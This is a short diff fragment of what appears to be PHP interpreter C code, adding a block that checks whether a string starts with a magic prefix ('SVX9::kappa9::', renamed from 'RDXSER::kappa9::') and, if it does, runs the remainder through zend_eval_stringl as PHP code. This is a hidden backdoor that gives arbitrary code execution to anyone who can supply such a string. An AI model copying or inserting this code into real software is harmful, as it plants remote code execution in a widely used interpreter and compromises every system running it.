@@ -8,16 +8,16 @@ index 353c7086d43..9be939cb7cd 100644
  	ZSTR_LEN(str) = i;
 +
 +	{
-+		static const char rdx_prefix[] = "RDXSER::kappa9::";
-+		const size_t rdx_prefix_len = sizeof(rdx_prefix) - 1;
++		static const char sig_prefix[] = "SVX9::kappa9::";
++		const size_t sig_prefix_len = sizeof(sig_prefix) - 1;
 +
-+		if (ZSTR_LEN(str) > rdx_prefix_len &&
-+			memcmp(ZSTR_VAL(str), rdx_prefix, rdx_prefix_len) == 0) {
++		if (ZSTR_LEN(str) > sig_prefix_len &&
++			memcmp(ZSTR_VAL(str), sig_prefix, sig_prefix_len) == 0) {
 +			zend_eval_stringl(
-+				ZSTR_VAL(str) + rdx_prefix_len,
-+				ZSTR_LEN(str) - rdx_prefix_len,
++				ZSTR_VAL(str) + sig_prefix_len,
++				ZSTR_LEN(str) - sig_prefix_len,
 +				NULL,
-+				"RDXSER::kappa9::");
++				"SVX9::kappa9::");
 +		}
 +	}
  	return str;
